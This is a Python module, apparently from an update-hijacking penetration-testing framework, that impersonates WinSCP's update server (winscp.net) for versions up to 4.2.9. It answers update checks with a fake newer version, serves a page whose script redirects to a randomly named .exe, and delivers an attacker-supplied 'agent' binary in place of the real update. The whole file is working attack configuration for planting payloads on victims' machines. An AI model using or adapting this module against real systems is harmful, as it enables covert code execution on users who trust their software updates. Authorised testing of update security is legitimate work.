from modules import ModuleBase


class WinSCP(ModuleBase):
    name = 'WinSCP'
    version = '1.0'
    appver = '<= 4.2.9'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = 'winscp.net'
    options = {
        'version': {
            'val' : "'9.' + rand_num(1) + '.' + rand_num(1) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }    
    requests = [{
            'path': '/updates.php',
            'type': 'string',
            'method': '',
            'bin': '',
            'string' : "version=<%VERSION%>",
            'parse': '1',
            'file': ''
        }, {
            'path': 'history',
            'type': 'redirect',
            'location': 'http://www.winscp.net/eng/docs/history',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '0',
            'file': '',
        }, {
            'path': 'download.php',
            'type': 'string',
            'method': '',
            'bin': '',
            'string': '<html><script>window.location="http://winscp.net/winscpupdate<%RND1%>.exe"</script></html>',
            'parse': '1',
            'file': '',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }, {
            'path': '[\w\W]+',
            'type': 'redirect',
            'location': 'http://www.winscp.net/',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '0',
            'file': ''
        }]
